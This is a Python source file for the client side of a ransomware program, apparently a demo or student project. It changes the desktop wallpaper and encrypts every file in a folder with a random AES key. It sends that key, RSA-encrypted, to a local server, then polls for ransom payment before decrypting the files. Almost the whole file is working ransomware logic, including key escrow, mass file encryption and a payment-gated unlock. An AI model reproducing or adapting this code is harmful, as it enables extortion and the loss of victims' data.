import math
import socket
from client_ui import Ui_MainWindow
from PyQt5.QtWidgets import QApplication
import sys
import rsa
from random import choice
import string
from aes import aescrypt
import os
import time
from threading import Thread
import tkinter.messagebox

import ctypes

class Client(Ui_MainWindow):
    def __init__(self):
        super(Client, self).__init__()
        self.flag_watch_and_cancel1=1
        path = "./modi.png"  # 存储图片的文件夹
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)  # 设置桌面壁纸

        print("初始化tcp客户端")
        self.sk = socket.socket()
        self.sk.connect(('127.0.0.1', 12323))

        random_key = self.GenPassword(20)
        #print(random_key)

        e_random_key = self.encrypt(random_key)
        # with open('aeskey.txt', 'wb')as f:
        #     f.write(e_random_key)

        dirpath = r'./test'
        self.paths = []
        for root, dirs, files in os.walk(dirpath):
            for file in files:
                self.paths.append(os.path.join(root, file))

        pr = aescrypt(random_key, 'ECB', '', 'gbk')
        for txt_file in self.paths:
            with open(txt_file, 'r') as f:
                content = f.read()
            f.close()
            with open(txt_file, 'w') as f:
                en_text = pr.aesencrypt(content)
                f.write(en_text)
            f.close()

        self.sk.sendall(bytes("1", "utf-8"))
        self.sk.sendall(bytes(e_random_key).__len__().to_bytes(4, byteorder='big'))
        self.sk.sendall(bytes(e_random_key))
        Thread(target=self._watch_and_cancel).start()

    def _watch_and_cancel(self):
        """Debug use only.
        Watch trade for 30s then cancel it.
        """
        paid = False
        flag=1
        for i in range(7200):
            time.sleep(1)
            if self.flag_watch_and_cancel1 == 0:
                flag=0
                break
            if self.paid_query():
                paid = True
                print("paid!")
                self.sk.sendall(bytes("2", "utf-8"))
                recv_random_key=self.recv_all_string()
                pr = aescrypt(recv_random_key, 'ECB', '', 'gbk')
                for txt_file in self.paths:
                    with open(txt_file, 'r') as f:
                        content = f.read()
                    f.close()
                    with open(txt_file, 'w') as f:
                        d_text = pr.aesdecrypt(content)
                        f.write(d_text)
                    f.close()

                tkinter.Tk().withdraw()
                tkinter.messagebox.showinfo('提示', "你的赎金已经支付，文件已经解锁了。")
                self.time.stop()
                break
            print("not paid...")
        if flag == 0:
            self.del_trade()
            print("here comes the new price")
        # order is not paid in 30s , cancel this order
        if paid is False and flag==1:
            self.del_trade()
            print("trade closed")

    def GenPassword(self,length=8, chars=string.ascii_letters + string.digits):
        return ''.join([choice(chars) for i in range(length)])

    def encrypt(self,key):  # 用公钥加密
        with open('public.pem', 'rb') as publickfile:
            p = publickfile.read()
        pubkey = rsa.PublicKey.load_pkcs1(p)
        original_text = key.encode('utf8')
        crypt_text = rsa.encrypt(original_text, pubkey)
        return crypt_text  # 加密后的密文

    def recv_string_by_length(self, len):
        return str(self.sk.recv(len), "utf-8")

    # 发送带长度的字符串
    def send_string_with_length(self, content):
        # 先发送内容的长度
        self.sk.sendall(bytes(content, encoding='utf-8').__len__().to_bytes(4, byteorder='big'))
        # 再发送内容
        self.sk.sendall(bytes(content, encoding='utf-8'))

    # 获取服务端传来的变长字符串，这种情况下服务器会先传一个长度值
    def recv_all_string(self):
        # 获取消息长度
        length = int.from_bytes(self.sk.recv(4), byteorder='big')
        b_size = 3 * 1024  # 注意utf8编码中汉字占3字节，英文占1字节
        times = math.ceil(length / b_size)
        content = ''
        for i in range(times):
            if i == times - 1:
                seg_b = self.sk.recv(length % b_size)
            else:
                seg_b = self.sk.recv(b_size)
            content += str(seg_b, encoding='utf-8')
        return content

    def send_number(self, number):
        self.sk.sendall(int(number).to_bytes(4, byteorder='big'))

    def recv_number(self):
        return int.from_bytes(self.sk.recv(4), byteorder='big')

if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = Client()
    win.show()
    sys.exit(app.exec_())